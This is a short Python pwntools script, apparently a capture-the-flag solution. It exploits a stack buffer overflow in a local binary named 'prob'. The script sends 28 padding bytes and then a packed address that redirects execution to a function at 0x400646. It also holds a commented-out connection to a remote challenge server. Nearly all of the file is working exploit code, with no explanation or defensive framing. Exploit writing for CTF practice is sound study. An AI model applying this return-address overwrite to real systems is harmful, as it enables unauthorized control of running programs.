from pwn import *

#p = remote('18.217.161.85','9999')
p = process('./prob')

bob=0x400646
payload="A"*28
payload+=p64(bob)
p.sendline(payload)
print p.recv()

